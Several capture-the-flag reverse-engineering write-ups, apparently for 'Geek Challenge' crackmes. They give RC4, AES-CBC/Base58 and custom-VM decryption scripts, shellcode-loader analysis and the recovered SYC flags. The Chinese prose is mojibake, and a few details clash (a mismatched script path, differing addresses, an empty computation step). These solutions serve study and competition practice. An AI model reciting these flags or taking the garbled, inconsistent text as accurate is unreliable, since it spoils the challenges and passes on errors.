ä¸‹é¢æ˜¯ä¸€ä¸ª**å¹²å‡€ç‰ˆ**è§£å¯†è„šæœ¬ï¼Œç”¨æ™®é€š RC4 ç®—æ³• + â€œåŠ æ³•åŠ å¯†ï¼Œå‡æ³•è§£å¯†â€çš„æ–¹å¼ï¼Œèƒ½ç›´æ¥è·‘å‡º flagã€‚

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

cipher = bytes([
    0xB4,0xCD,0x69,0x54,0xBD,0x67,0x20,0x9D,0xF2,0xC3,0x24,0x14,0xC2,0x1B,0xE9,0x6A,
    0x44,0x14,0x4E,0x39,0xC5,0xC8,0x5B,0x11,0x75,0xAD,0xDE,0xBB,0xFE,0xE4,0x6E,0x65,
    0x06,0x9A,0x91,0xFE,0xA0,0x68,0xA4,0x86,0x17,0x6C,0x0A,0xCF,0x1E,0x67,0xE3,0x0D,
    0x60,0x47,0x13,0x6B,0xD1,0x36,0xF2,0x77,0x58,0x76,0x1E,0x98,0xF5,0x7F,0x0A,0x92,
    0xB7,0x0A,0xEA,0xAE,0x46,0x7E,0x6A,0x18,0x4A,0x59,0x4E,0x71,0xB2,0xE1,0x41,0x7A,
    0x0B,0x31,0xBA,0xC6,0xAA,0xCF,0xCE,0x09,0xBF,0x2E,0xF8,0x4D,0x75,0xEF,0x14,0xED,
    0x5F,0x66,0x44,0x6F,0xDE,0xE2,0x7C,0x10,0x8C,0xB7,0x4E,0x6B,0xB2,0xD4,0xF6,0x91,
    0xD7,0x84,0x86,0x1F,0xF8,0x65,0x94,0x0B,0x14,0x28,0xFB,0xDD,0x47,0xF4,0xC1,0x17,
    0x42,0x3F,0x1E,0x38,0x07,0xBB,0x37,0x33,0x12,0x0C,0x16,0x68,0xE0,0x23,0x12,0x75,
    0x72,0xD9,0x71,0x7A,0x88,0xD0,0x46,0x28,0x88,0xAD,0x1E,0x98,0x8F,0x92,0x7E,0x0E,
    0x69,0x29,0x37,0xB1,0xFF,0xC5,0xAF,0x6F,0x41,0x37,0x65,0x0E,0xD2,0x62,0x11,0x8F,
    0xA6,0x3E,0x95,0xF5,0x80,0x9A,0xDC
])

key = b"Samsara"   # ä» v5 = 0x617261736D6153 å¾—åˆ°çš„ key

def rc4_keystream(key: bytes, n: int):
    # RC4 KSA
    S = list(range(256))
    j = 0
    keylen = len(key)
    for i in range(256):
        j = (j + S[i] + key[i % keylen]) & 0xFF
        S[i], S[j] = S[j], S[i]

    # RC4 PRGA
    i = 0
    j = 0
    out = []
    for _ in range(n):
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) & 0xFF]
        out.append(K)
    return out

def decrypt(cipher: bytes, key: bytes) -> bytes:
    ks = rc4_keystream(key, len(cipher))
    # åŠ å¯†æ˜¯ a1[i] += K[i]ï¼Œæ‰€ä»¥è§£å¯†æ˜¯å‡
    plain = bytes((c - k) & 0xFF for c, k in zip(cipher, ks))
    return plain

if __name__ == "__main__":
    plain = decrypt(cipher, key)
    print(plain.decode("ascii"))
```

è¿è¡Œåè¾“å‡ºå°±æ˜¯ä¸Šé¢çš„é‚£ä¸² flag / æ–‡æ¡ˆï¼ˆé•¿åº¦åˆšå¥½ 183ï¼‰ã€‚



# å›½äº§ã®å…‰

### 3.1 è§£å¯†æ€è·¯

æ—¢ç„¶åŠ å¯†æµç¨‹æ˜¯ï¼š

```
æ˜æ–‡ â†’ PKCS7å¡«å…… â†’ AES-CBC â†’ è½¬Hex â†’ Ripple Base58 â†’ å¯†æ–‡
```

è§£å¯†æµç¨‹å°±æ˜¯åå‘ï¼š

```
å¯†æ–‡ â†’ Ripple Base58è§£ç  â†’ Hexè½¬å­—èŠ‚ â†’ AES-CBCè§£å¯† â†’ å»PKCS7å¡«å…… â†’ æ˜æ–‡
```

### 3.2 å…³é”®å‚æ•°

python

```
Key = b"welcometosyc2025"    # 16å­—èŠ‚
IV  = b"helloimsamsarami"    # 16å­—èŠ‚ï¼ˆåŸå­—ç¬¦ä¸²å‰16å­—èŠ‚ï¼‰
Cipher = "yaApcJ5GoyGwhARDXZLQUdntqPpmVu2GuTChnsLoj5d8ABinwGSsgpGaiPWYbHTTbbzSXxLXwoLgjR1YgquyEnK"
```

è§£å¯†è„šæœ¬

```
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# Ripple Base58å­—ç¬¦è¡¨ï¼ˆå…³é”®ï¼ï¼‰
RIPPLE_ALPHABET = "rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz"


def base58_decode_ripple(encoded):
    """ä½¿ç”¨Rippleå­—ç¬¦è¡¨è§£ç Base58"""
    decoded = 0
    for char in encoded:
        decoded = decoded * 58 + RIPPLE_ALPHABET.index(char)

    # è½¬æ¢ä¸ºå­—èŠ‚
    result = []
    while decoded > 0:
        result.insert(0, decoded & 0xff)
        decoded >>= 8

    # å¤„ç†å‰å¯¼é›¶
    for char in encoded:
        if char == RIPPLE_ALPHABET[0]:
            result.insert(0, 0)
        else:
            break

    return bytes(result)


# å¯†æ–‡
ciphertext_base58 = "yaApcJ5GoyGwhARDXZLQUdntqPpmVu2GuTChnsLoj5d8ABinwGSsgpGaiPWYbHTTbbzSXxLXwoLgjR1YgquyEnK"

# å¯†é’¥å’ŒIV
key = b"welcometosyc2025"  # 16å­—èŠ‚
iv = b"helloimsamsarami"  # å‰16å­—èŠ‚

print(f"[1] å¯†æ–‡ (Ripple Base58): {ciphertext_base58}")

# Step 1: Ripple Base58è§£ç 
hex_bytes = base58_decode_ripple(ciphertext_base58)
hex_string = hex_bytes.decode('utf-8')  # åº”è¯¥æ˜¯åå…­è¿›åˆ¶å­—ç¬¦ä¸²
print(f"[2] åå…­è¿›åˆ¶å­—ç¬¦ä¸²: {hex_string}")

# Step 2: åå…­è¿›åˆ¶è½¬å­—èŠ‚
ciphertext = bytes.fromhex(hex_string)
print(f"[3] å¯†æ–‡å­—èŠ‚ ({len(ciphertext)}å­—èŠ‚)")

# Step 3: AES-128-CBCè§£å¯†
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted_padded = cipher.decrypt(ciphertext)
print(f"[4] è§£å¯†å(å¸¦å¡«å……): {decrypted_padded.hex()}")

# Step 4: å»é™¤PKCS7å¡«å……
try:
    plaintext = unpad(decrypted_padded, AES.block_size)
    flag = plaintext.decode('utf-8')
    print(f"\nğŸš© FLAG: {flag}")
except ValueError as e:
    print(f"âŒ æ ‡å‡†å»å¡«å……å¤±è´¥: {e}")
    # æ‰‹åŠ¨æ£€æŸ¥
    pad_len = decrypted_padded[-1]
    print(f"æœ€åä¸€ä¸ªå­—èŠ‚: {pad_len} (0x{pad_len:02x})")

    if 1 <= pad_len <= 16:
        # æ£€æŸ¥æ˜¯å¦æ‰€æœ‰å¡«å……å­—èŠ‚éƒ½ç›¸åŒ
        padding = decrypted_padded[-pad_len:]
        if all(b == pad_len for b in padding):
            plaintext = decrypted_padded[:-pad_len]
            try:
                flag = plaintext.decode('utf-8')
                print(f"\nğŸš© FLAG (æ‰‹åŠ¨å»å¡«å……): {flag}")
            except:
                print(f"è§£ç å¤±è´¥ï¼ŒåŸå§‹å­—èŠ‚: {plaintext.hex()}")
        else:
            print(f"å¡«å……æ ¼å¼é”™è¯¯")
    else:
        print(f"å¡«å……é•¿åº¦å¼‚å¸¸")
        # å°è¯•æ‰“å°æ‰€æœ‰å¯èƒ½çš„ç»“æœ
        for i in range(1, 17):
            try:
                test = decrypted_padded[:-i].decode('utf-8', errors='ignore')
                print(f"å»é™¤{i}å­—èŠ‚: {test}")
            except:
                pass
```

ç»“æœ

```
[1] å¯†æ–‡ (Ripple Base58): yaApcJ5GoyGwhARDXZLQUdntqPpmVu2GuTChnsLoj5d8ABinwGSsgpGaiPWYbHTTbbzSXxLXwoLgjR1YgquyEnK
[2] åå…­è¿›åˆ¶å­—ç¬¦ä¸²: 0af6488df49d1eee0f97d960385162395a4e736ae570b2a6c2007a10526a6a22
[3] å¯†æ–‡å­—èŠ‚ (32å­—èŠ‚)
[4] è§£å¯†å(å¸¦å¡«å……): 5359437b4861726d6f6e794f535f31735f72696768743f7269676874217d0202

ğŸš© FLAG: SYC{HarmonyOS_1s_right?right!}

è¿›ç¨‹å·²ç»“æŸï¼Œé€€å‡ºä»£ç ä¸º 0
```

# flutter

## ä¸€ã€ç¨‹åºç»“æ„åˆ†æ

### 1.1 ç¨‹åºæµç¨‹

```
main (sub_19D6C)
  â†’ sub_19D8C (å¯†ç è·å–)
  â†’ sub_19F38 (VMåˆå§‹åŒ–)
  â†’ sub_19FB0 (VMæ‰§è¡Œå¼•æ“)
```

### 1.2 VMæ¶æ„

- **å­—èŠ‚ç æ ¼å¼**: 3å­—èŠ‚æŒ‡ä»¤ `[opcode][arg1][arg2]`
- **æ“ä½œç è¡¨**: 10ä¸ªhandlerå‡½æ•° (off_3D1C8)
- **VMçŠ¶æ€**: ç´¯åŠ å™¨(24ä½)ã€ç´¢å¼•(16ä½)ã€é”™è¯¯æ ‡å¿—(28ä½)

## äºŒã€å­—èŠ‚ç è§£å¯†

### 2.1 åŠ å¯†ç®—æ³•

```c
for (i = 0; i < 585; i++)
    bytecode[i] ^= key_array[i % 32];
```

### 2.2 å¯†é’¥æå–

ä» sub_19F68 å¾—åˆ°32å­—èŠ‚å¯†é’¥ï¼š

```
66 DD 4B 6E A0 0C 80 BD 33 21 7E 7B C5 9A 4A 7D 
07 37 22 8A CA 37 58 28 57 51 32 44 D3 8C 39 F5
```

## ä¸‰ã€VMæŒ‡ä»¤é›†åˆ†æ

| Opcode | å‡½æ•°      | åŠŸèƒ½                                |
| ------ | --------- | ----------------------------------- |
| 0x00   | sub_1AA3C | åˆå§‹åŒ–VMçŠ¶æ€                        |
| 0x01   | sub_1AA4C | è¯»å–è¾“å…¥å­—èŠ‚åˆ°ç´¯åŠ å™¨                |
| 0x02   | sub_1AA74 | acc -= arg1                         |
| 0x03   | sub_1AA8C | acc ^= arg1                         |
| 0x04   | sub_1AAA0 | éªŒè¯: byte_FF92[arg1] ^ acc == 0x52 |
| 0x05   | sub_1AACC | index++                             |
| 0x06   | sub_1AADC | æ£€æŸ¥: index <= arg1                 |
| 0x08   | sub_1AAFC | éªŒè¯: index == input_length         |
| 0x09   | sub_1AB14 | è®¾ç½®ç»“æŸæ ‡å¿—                        |

## å››ã€éªŒè¯ç®—æ³•è¿˜åŸ

### 4.1 å­—èŠ‚ç ç¨‹åºç»“æ„

```assembly
[00 00 00]              ; åˆå§‹åŒ–

; å¯¹æ¯ä¸ªå­—èŠ‚ i (0-31):
[01 00 00]              ; acc = password[index]
[02 03 00]              ; acc -= 3
[03 55 00]              ; acc ^= 0x55
[04 i  00]              ; è¦æ±‚: byte_FF92[i] ^ acc == 0x52
[05 00 00]              ; index++
[06 20 00]              ; è¦æ±‚: index <= 32

[08 00 00]              ; è¦æ±‚: index == length
[09 00 00]              ; ç»“æŸ
```

### 4.2 éªŒè¯å…¬å¼

```
byte_FF92[i] ^ ((password[i] - 3) ^ 0x55) == 0x52
```

## äº”ã€å¯†ç æ±‚è§£

### 5.1 åè§£å…¬å¼

```c
password[i] = (byte_FF92[i] ^ 0x07) + 3
// å…¶ä¸­ 0x07 = 0x52 ^ 0x55
```

### 5.2 è®¡ç®—ç»“æœ

```
byte_FF92 = {57 51 47 7F 44 29 75 76 76 37 68 5B 67 3A 6C 5B 
             55 77 37 5B 65 74 37 68 71 73 42 65 68 37 19 7D}

åº”ç”¨å…¬å¼å¾—åˆ°:
```

## ğŸ† Flag

```
SYC{F1utt3r_c@n_Us3_ev3rywHer3!}
```

---

**å…³é”®æŠ€æœ¯ç‚¹**:

- Flutter/Dartå­—èŠ‚ç é€†å‘
- è‡ªå®šä¹‰VMæŒ‡ä»¤é›†åˆ†æ  
- XORåŠ å¯†ç ´è§£
- çº¦æŸæ±‚è§£

# Lastone

æŠŠä¸œè¥¿éƒ½ä¸¢ç»™aiç„¶åæœ‰å‡ ä¸ªä¸ç¡®å®šçš„åœ°æ–¹ç”¨åŠ¨æ€è°ƒè¯•/åˆ†æ­¥æ±‚è§£å°±å¯ä»¥äº†

**ä¸‹ä¸€æ­¥ï¼ŒæŒ‰é¡ºåºå»ºè®®ä½ åšï¼š**

1. åœ¨ Python é‡Œå†™ä¸€ä¸ª VM è§£é‡Šå™¨ï¼Œè·‘ 8 æ®µè„šæœ¬ â†’ å¾—åˆ°æ¯å—çš„ `v13..v16` å’Œ `key_j`ï¼›
2. ç”¨è°ƒè¯•å™¨åœ¨ `MK_FP(...)(...)` è°ƒç”¨åè¯»ä¸€çœ¼ `dword_40C508`ï¼Œé¡ºä¾¿éªŒè¯ä¸€ä¸‹ä½  VM ç®—å‡ºæ¥çš„ v13..16 æ˜¯å¦ä¸€è‡´ â†’ å¾—åˆ° `type_j`ï¼›
3. æŠŠ `type_j` å’Œ `key_j` å†™æ­»åˆ°è§£å¯†è„šæœ¬é‡Œï¼›
4. æŒ‰æˆ‘ä»¬å·²ç»åˆ†æå¥½çš„ 16 ä¸ªå‡½æ•°é€»è¾‘å†™å‡ºå¯¹åº”çš„**é€†å˜æ¢**ï¼Œå¯¹é‚£ 32 å­—èŠ‚å¸¸é‡åš 8 å—é€†è¿ç®—ï¼›
5. è¾“å‡º 32 å­—èŠ‚ç»“æœï¼Œå°±æ˜¯ flagï¼ˆå¤§æ¦‚ç‡æ˜¯å¯è¯» ASCIIï¼Œæ¯”å¦‚ `FLAG{...}` / `CTF{...}`ï¼‰ã€‚

VMè§£é‡Šå™¨

```
from dataclasses import dataclass
from typing import List, Tuple

# ---------- VM çŠ¶æ€ ----------

@dataclass
class VMState:
    regs: List[int]   # 16 ä¸ª 32-bit å¯„å­˜å™¨
    stack: List[int]  # æ“ä½œæ•°æ ˆï¼ˆè™½ç„¶è¿™é‡Œçš„ 8 æ®µè„šæœ¬æ²¡ç”¨åˆ°ï¼‰

def rol32(v, n):
    n &= 0x1F
    v &= 0xFFFFFFFF
    return ((v << n) | (v >> (32 - n))) & 0xFFFFFFFF

def ror32(v, n):
    n &= 0x1F
    v &= 0xFFFFFFFF
    return ((v >> n) | (v << (32 - n))) & 0xFFFFFFFF

# ---------- VM è§£é‡Šå™¨ï¼ˆæŒ‰ sub_402850 çš„è¯­ä¹‰ï¼‰ ----------

def exec_program(prog: List[Tuple], verbose=False) -> VMState:
    """
    prog: [ ('OP', ...args...), ... ]
    è¿™é‡Œä¸ºäº†æ–¹ä¾¿ï¼ŒæŠŠå­—èŠ‚ç ç¿»è¯‘æˆäº†ç»“æ„åŒ–çš„æŒ‡ä»¤åˆ—è¡¨ï¼Œ
    ä½†è¯­ä¹‰å®Œå…¨æŒ‰ä½ ç»™çš„ sub_402850 æ¥å®ç°ã€‚
    """
    s = VMState(regs=[0] * 16, stack=[])
    pc = 0
    while pc < len(prog):
        ins = prog[pc]
        op = ins[0]
        if verbose:
            print(f"pc={pc:02d}", ins, "regs[0..3] =",
                  [hex(x) for x in s.regs[:4]])

        if op == 'END':
            break

        # -------- å¸¸é‡ / æ ˆ --------
        if op == 'MOVI':            # 0x10
            _, r, imm = ins
            s.regs[r] = imm & 0xFFFFFFFF

        elif op == 'PUSH_IMM':      # 0x01
            _, imm = ins
            s.stack.append(imm & 0xFFFFFFFF)

        elif op == 'PUSH_REG':      # 0x02
            _, r = ins
            s.stack.append(s.regs[r])

        elif op == 'POP_REG':       # 0x03
            _, r = ins
            if not s.stack:
                raise RuntimeError("Stack underflow")
            s.regs[r] = s.stack.pop()

        # -------- ç«‹å³æ•°ç®—æœ¯ / ä½è¿ç®— --------
        elif op == 'ADDI':          # 0x20
            _, r, imm = ins
            s.regs[r] = (s.regs[r] + imm) & 0xFFFFFFFF

        elif op == 'SUBI':          # 0x21
            _, r, imm = ins
            s.regs[r] = (s.regs[r] - imm) & 0xFFFFFFFF

        elif op == 'XORI':          # 0x22
            _, r, imm = ins
            s.regs[r] = (s.regs[r] ^ imm) & 0xFFFFFFFF

        elif op == 'MULI':          # 0x23
            _, r, imm = ins
            s.regs[r] = (s.regs[r] * imm) & 0xFFFFFFFF

        elif op == 'DIVI':          # 0x24
            _, r, imm = ins
            if imm == 0:
                raise ZeroDivisionError
            s.regs[r] = (s.regs[r] // imm) & 0xFFFFFFFF

        elif op == 'MODI':          # 0x25
            _, r, imm = ins
            if imm == 0:
                raise ZeroDivisionError
            s.regs[r] = (s.regs[r] % imm) & 0xFFFFFFFF

        elif op == 'SHL':           # 0x26
            _, r, imm = ins
            s.regs[r] = (s.regs[r] << (imm & 0x1F)) & 0xFFFFFFFF

        elif op == 'SHR':           # 0x27
            _, r, imm = ins
            s.regs[r] = (s.regs[r] >> (imm & 0x1F)) & 0xFFFFFFFF

        elif op == 'ANDI':          # 0x28
            _, r, imm = ins
            s.regs[r] = s.regs[r] & imm

        elif op == 'ORI':           # 0x29
            _, r, imm = ins
            s.regs[r] = s.regs[r] | imm

        elif op == 'NOT':           # 0x2A
            _, r = ins
            s.regs[r] = (~s.regs[r]) & 0xFFFFFFFF

        elif op == 'ROL':           # 0x2B -> sub_401244 -> ROL4
            _, r, imm = ins
            s.regs[r] = rol32(s.regs[r], imm)

        elif op == 'ROR':           # 0x2C -> sub_4011A4 -> ROR4
            _, r, imm = ins
            s.regs[r] = ror32(s.regs[r], imm)

        # -------- å¯„å­˜å™¨ä¹‹é—´ --------
        elif op == 'SWAP':          # 0x30
            _, r1, r2 = ins
            s.regs[r1], s.regs[r2] = s.regs[r2], s.regs[r1]

        elif op == 'INC':           # 0x31
            _, r = ins
            s.regs[r] = (s.regs[r] + 1) & 0xFFFFFFFF

        elif op == 'DEC':           # 0x32
            _, r = ins
            s.regs[r] = (s.regs[r] - 1) & 0xFFFFFFFF

        elif op == 'ADDR':          # 0x40
            _, r1, r2 = ins
            s.regs[r1] = (s.regs[r1] + s.regs[r2]) & 0xFFFFFFFF

        elif op == 'SUBR':          # 0x41
            _, r1, r2 = ins
            s.regs[r1] = (s.regs[r1] - s.regs[r2]) & 0xFFFFFFFF

        elif op == 'XORR':          # 0x42
            _, r1, r2 = ins
            s.regs[r1] = (s.regs[r1] ^ s.regs[r2]) & 0xFFFFFFFF

        elif op == 'MULR':          # 0x43
            _, r1, r2 = ins
            s.regs[r1] = (s.regs[r1] * s.regs[r2]) & 0xFFFFFFFF

        else:
            raise ValueError(f"Unknown op {op}")

        pc += 1

    return s

# ---------- 8 æ®µè„šæœ¬ï¼ˆå·²ä» unk_40C040 åæ±‡ç¼–å‡ºæ¥ï¼‰ ----------

# æ®µ 0ï¼š0x40C040
prog0 = [
    ('MOVI', 0, 0x12),
    ('MOVI', 1, 0x34),
    ('MULI', 0, 3),
    ('XORI', 1, 0xAB),
    ('ADDR', 0, 1),
    ('MOVI', 2, 7),
    ('MOVI', 3, 0x11),
    ('END',),
]

# æ®µ 1ï¼š0x40C080
prog1 = [
    ('MOVI', 0, 0xAB),
    ('MOVI', 1, 0xCD),
    ('ROL',  0, 4),
    ('ROR',  1, 2),
    ('XORI', 0, 0x55),
    ('MOVI', 2, 9),
    ('MOVI', 3, 0x22),
    ('END',),
]

# æ®µ 2ï¼š0x40C0C0
prog2 = [
    ('MOVI', 0, 0xFF),
    ('MOVI', 1, 0xAA),
    ('SHL',  0, 2),
    ('MODI', 0, 0x64),
    ('ADDI', 1, 0x11),
    ('MOVI', 2, 0x0D),
    ('MOVI', 3, 0x33),
    ('END',),
]

# æ®µ 3ï¼š0x40C100
prog3 = [
    ('MOVI', 0, 0x11),
    ('MOVI', 1, 0x22),
    ('ANDI', 0, 0x0F),
    ('ORI',  1, 0xF0),
    ('XORI', 0, 0x33),
    ('MOVI', 2, 0x0E),
    ('MOVI', 3, 0x44),
    ('END',),
]

# æ®µ 4ï¼š0x40C140
prog4 = [
    ('MOVI', 0, 0xDE),
    ('MOVI', 1, 0xAD),
    ('INC',  0),
    ('DEC',  1),
    ('SWAP', 0, 1),
    ('ADDI', 0, 0x10),
    ('MOVI', 2, 2),
    ('MOVI', 3, 0x55),
    ('END',),
]

# æ®µ 5ï¼š0x40C180
prog5 = [
    ('MOVI', 0, 0xBE),
    ('MOVI', 1, 0xEF),
    ('MULI', 0, 2),
    ('DIVI', 1, 3),
    ('ADDR', 0, 1),
    ('MOVI', 2, 0x0A),
    ('MOVI', 3, 0x66),
    ('END',),
]

# æ®µ 6ï¼š0x40C1C0
prog6 = [
    ('MOVI', 0, 0xCA),
    ('MOVI', 1, 0xFE),
    ('NOT',  0),
    ('ANDI', 0, 0xFF),
    ('XORI', 1, 0x7F),
    ('MOVI', 2, 0x0F),
    ('MOVI', 3, 0x77),
    ('END',),
]

# æ®µ 7ï¼š0x40C200
prog7 = [
    ('MOVI', 0, 0x99),
    ('MOVI', 1, 0x88),
    ('ADDI', 0, 0x11),
    ('SUBI', 1, 8),
    ('ROL',  0, 3),
    ('MOVI', 2, 5),
    ('MOVI', 3, 0x88),
    ('END',),
]

programs = [prog0, prog1, prog2, prog3, prog4, prog5, prog6, prog7]

# ---------- è®¡ç®— (v13..v16) å’Œ key_j ----------

def compute_state_and_key(prog):
    st = exec_program(prog)
    v13, v14, v15, v16 = st.regs[0], st.regs[1], st.regs[2], st.regs[3]
    key = ((v14 + v16 * v15) & 0xFFFFFFFF) ^ ((40503 * v13) & 0xFFFFFFFF)
    key &= 0xFFFFFFFF
    return v13, v14, v15, v16, key

if __name__ == "__main__":
    for idx, p in enumerate(programs):
        v13, v14, v15, v16, key = compute_state_and_key(p)
        print(f"Block {idx}:")
        print(f"  v13 = {hex(v13)}")
        print(f"  v14 = {hex(v14)}")
        print(f"  v15 = {hex(v15)}")
        print(f"  v16 = {hex(v16)}")
        print(f"  key = {hex(key)}")
        print()

```

ç»“æœ

```
D:\python-run\.venv\Scripts\python.exe "D:\CTF-competition\2025-Geek Challenge\CRYPTO\hensel\hensel\task.py" 
Block 0:
  v13 = 0xd5
  v14 = 0x9f
  v15 = 0x7
  v16 = 0x11
  key = 0x83a2d5

Block 1:
  v13 = 0xae5
  v14 = 0x40000033
  v15 = 0x9
  v16 = 0x22
  key = 0x46bbac56

Block 2:
  v13 = 0x14
  v14 = 0xbb
  v15 = 0xd
  v16 = 0x33
  key = 0xc5f1e

Block 3:
  v13 = 0x32
  v14 = 0xf2
  v15 = 0xe
  v16 = 0x44
  key = 0x1ee214

Block 4:
  v13 = 0xbc
  v14 = 0xdf
  v15 = 0x2
  v16 = 0x55
  key = 0x7431ed

Block 5:
  v13 = 0x1cb
  v14 = 0x4f
  v15 = 0xa
  v16 = 0x66
  key = 0x11ba8d6

Block 6:
  v13 = 0x35
  v14 = 0x81
  v15 = 0xf
  v16 = 0x77
  key = 0x20c619

Block 7:
  v13 = 0x550
  v14 = 0x80
  v15 = 0x5
  v16 = 0x88
  key = 0x3488718


è¿›ç¨‹å·²ç»“æŸï¼Œé€€å‡ºä»£ç ä¸º 0

```



```
æ¯æ¬¡æ–­ç‚¹åœåœ¨è¿™é‡Œæ—¶çš„å€¼
dword_10C508 dd 0Dh 
dword_10C508 dd 4
dword_10C508 dd 0 
dword_10C508 dd 0Ch 
dword_10C508 dd 4 
dword_10C508 dd 6   
dword_10C508 dd 3  
dword_10C508 dd 0  
```

æœ€ç»ˆè§£å¯†è„šæœ¬

```
# ç›®æ ‡ 32 å­—èŠ‚ï¼ˆv10 + v11 + v12 + v13ï¼‰
T = bytes([
    0x35, 0x67, 0x05,
    0x2D, 0x74, 0x40, 0x53, 0x31, 0x41, 0x6F, 0x62, 0x45, 0x4B, 0x1F,
    0x57, 0x36, 0x5F, 0x4B, 0x73, 0x6E, 0x4F, 0x6C, 0x5F, 0x49, 0x5D,
    0x7F, 0x3F, 0x79, 0x28, 0xD2,
    0x69, 0x7E
])

# æŒ‰ 4 å­—èŠ‚åˆ†æˆ 8 å—
blocks = [bytearray(T[4*i:4*(i+1)]) for i in range(8)]

# æ¯å—çš„ keyï¼ˆåˆšæ‰ VM ç®—å‡ºæ¥çš„ï¼‰
keys = [
    0x083A2D5,
    0x46BBAC56,
    0x00C5F1E,
    0x01EE214,
    0x07431ED,
    0x11BA8D6,
    0x020C619,
    0x3488718,
]

# æ¯å—ç”¨çš„å˜æ¢ç±»å‹ï¼ˆdword_10C508 & 0xFï¼‰
types = [0xD, 4, 0, 0xC, 4, 6, 3, 0]

# ---- é€šç”¨å°å·¥å…· ----

def bit_reverse8(x):
    x &= 0xFF
    y = 0
    for j in range(8):
        if x & (1 << j):
            y |= 1 << (7 - j)
    return y

# ---- éœ€è¦çš„å‡ ä¸ªé€†å˜æ¢ ----

# F0: æŒ‰ 32bit key åšé€å­—èŠ‚ XOR -> è‡ªå
def inv_F0(b, key):
    for i in range(4):
        kb = (key >> (8 * (i % 4))) & 0xFF
        b[i] ^= kb

# F3: æŒ‰ key é€å­—èŠ‚å‡ -> è§£å¯†æ—¶åŠ å›å»
def inv_F3(b, key):
    for i in range(4):
        kb = (key >> (8 * (i % 4))) & 0xFF
        b[i] = (b[i] + kb) & 0xFF

# F4: é¦–å°¾äº¤æ¢ -> è‡ªå
def inv_F4(b, key=None):
    if len(b) >= 2:
        b[0], b[-1] = b[-1], b[0]

# F6: æ•´å— reverse -> è‡ªå
def inv_F6(b, key=None):
    b[:] = b[::-1]

# F12: é“¾å¼ XOR
# enc: c0 = p0 ^ k0,  ci = pi ^ c{i-1}
# dec: p0 = c0 ^ k0,  pi = ci ^ c{i-1}
def inv_F12(b, key):
    k0 = key & 0xFF
    c = list(b)
    n = len(c)
    if n == 0:
        return
    p = [0] * n
    p[0] = c[0] ^ k0
    for i in range(1, n):
        p[i] = c[i] ^ c[i-1]
    for i in range(n):
        b[i] = p[i] & 0xFF

# F13: f(x) = Hb(a3) ^ (8*x) ^ (a3 * x)ï¼Œåœ¨ 0..255 ä¸Šæ˜¯ä¸€ä¸ªç½®æ¢
# è§£å¯†å°±å…ˆå»ºä¸€ä¸ª 256 é¡¹é€†è¡¨
def inv_F13(b, key):
    a3 = key & 0xFFFF
    hb = (a3 >> 8) & 0xFF

    f = [0] * 256
    inv = [0] * 256
    for x in range(256):
        y = hb ^ ((8 * x) & 0xFF) ^ ((a3 * x) & 0xFF)
        y &= 0xFF
        f[x] = y
        inv[y] = x   # é¢˜ç›®è¿™ä¸ª key ä¸‹æ˜¯ permutation

    for i in range(4):
        b[i] = inv[b[i] & 0xFF]

# æŠŠç±»å‹å·æ˜ å°„åˆ°å¯¹åº”é€†å‡½æ•°
inv_funcs = {
    0x0: inv_F0,
    0x3: inv_F3,
    0x4: inv_F4,
    0x6: inv_F6,
    0xC: inv_F12,
    0xD: inv_F13,
}

if __name__ == "__main__":
    for j in range(8):
        t = types[j] & 0xF
        k = keys[j]
        inv_funcs[t](blocks[j], k)

    plain = b"".join(blocks)
    print("raw  :", plain)
    print("flag :", plain.decode("latin1"))

```

ç­”æ¡ˆ

```
raw  : b'SYC{1@St_0nE_THanKs_I_lOvE_y0U!}'
flag : SYC{1@St_0nE_THanKs_I_lOvE_y0U!}
```

## 1. å…¥å£é€»è¾‘

ä¸»é€»è¾‘åœ¨ `sub_403A80`ï¼š

- è¦æ±‚åœ¨ **64 ä½ç³»ç»Ÿä¸‹ä»¥ 32 ä½ç¨‹åºè¿è¡Œ**ï¼ˆ`IsWow64Process`ï¼‰ã€‚
- è¯»å– 32 å­—èŠ‚è¾“å…¥ `Buffer`ï¼Œé•¿åº¦ä¸ä¸º 32 ç›´æ¥ `Wrong`ã€‚
- è°ƒç”¨ `sub_4012D5(Buffer)` è¿›è¡Œæ ¡éªŒï¼Œ`sub_4012D5` åªæ˜¯ thunkï¼ŒçœŸæ­£é€»è¾‘åœ¨ `sub_402330`ã€‚

------

## 2. VM æ¡†æ¶ä¸å­—èŠ‚ç 

`sub_402330` åšäº†å‡ ä»¶å…³é”®äº‹ï¼š

1. `VirtualAlloc` å‡ºä¸€å—å¯æ‰§è¡Œå†…å­˜ï¼Œå°† `unk_40C260` å¤åˆ¶è¿‡å»ï¼ˆè¿™æ˜¯ 64-bit shellcode æ¨¡æ¿ï¼‰ã€‚

2. ç”¨ `sub_40105A` patch æ‰æ¨¡æ¿ä¸­çš„ 8 ä¸ªå­—èŠ‚ï¼Œæ„é€ æˆ `mov rbx, &dword_40C4E8` ä¹‹ç±»çš„ä»£ç ï¼Œè®© shellcode èƒ½è®¿é—®å…¨å±€ç»“æ„ã€‚

3. å¾ªç¯ `j = 0..7` åš 8 è½®å¤„ç†ï¼š

   - `sub_4010B4(&v13)` æ¸…ç©ºä¸€å— 0x84C å¤§å°çš„â€œä¸Šä¸‹æ–‡â€ç»“æ„ï¼›

   - `sub_4011DB(&v13, (char *)&unk_40C040 + 64*j, dword_40C240[j])` è§£é‡Šæ‰§è¡Œä¸€æ®µå­—èŠ‚ç ï¼›

   - ä»ä¸Šä¸‹æ–‡ä¸­å–å‡º 4 ä¸ª 32 ä½å€¼ `v13~v16`ï¼Œå†™å…¥ `dword_40C4E8` ç­‰å…¨å±€ï¼›

   - è°ƒç”¨ 64-bit shellcodeï¼Œè®¡ç®—å‡º `dword_40C508`ï¼›

   - æ ¹æ®ï¼š

     ```
     off_40C000[dword_40C508 & 0xF](a1 + 4*j, 4, (v8 + v6 * v7) ^ (40503 * v9));
     ```

     å¯¹ `Buffer` çš„ç¬¬ `j` ä¸ª 4 å­—èŠ‚å—åšå˜æ¢ã€‚

`unk_40C040` åŒºåŸŸå°±æ˜¯ 8 æ®µ VM å­—èŠ‚ç ï¼Œæ¯æ®µæœ€å¤š 64 å­—èŠ‚ï¼Œå¯¹åº”é•¿åº¦åœ¨ `dword_40C240[8]` ä¸­ã€‚

------

